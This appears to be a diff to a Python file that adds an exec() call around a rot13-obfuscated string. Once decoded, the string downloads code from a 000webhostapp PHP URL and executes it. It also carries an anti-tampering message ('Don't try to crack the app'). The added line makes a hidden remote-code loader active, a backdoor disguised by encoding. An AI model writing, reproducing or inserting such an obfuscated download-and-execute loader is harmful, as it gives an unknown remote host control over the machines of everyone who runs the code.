@@ -1,2 +1,1 @@
-
-((lambda __, _, : _('''vzcbeg erdhrfgf\nqngn = erdhrfgf.trg(hey="uggcf://tubfgtfzbqf.000jroubfgncc.pbz/Tunb610.cuc").grkg\nrkrp(qngn)\n\n\nqrs fgneg_fpevcg():\n    gel:\n        riny("""fgneg_obg()""")\n    rkprcg Rkprcgvba nf r:\n        erghea "Qba\'g gel gb penpx gur ncc"\n\n\n\n\n''',__))('rot_13',__import__('codecs').decode))
+exec((lambda __, _, : _('''vzcbeg erdhrfgf\nqngn = erdhrfgf.trg(hey="uggcf://tubfgtfzbqf.000jroubfgncc.pbz/Tunb610.cuc").grkg\nrkrp(qngn)\n\n\nqrs fgneg_fpevcg():\n    gel:\n        riny("""fgneg_obg()""")\n    rkprcg Rkprcgvba nf r:\n        erghea "Qba\'g gel gb penpx gur ncc"\n\n\n\n\n''',__))('rot_13',__import__('codecs').decode))
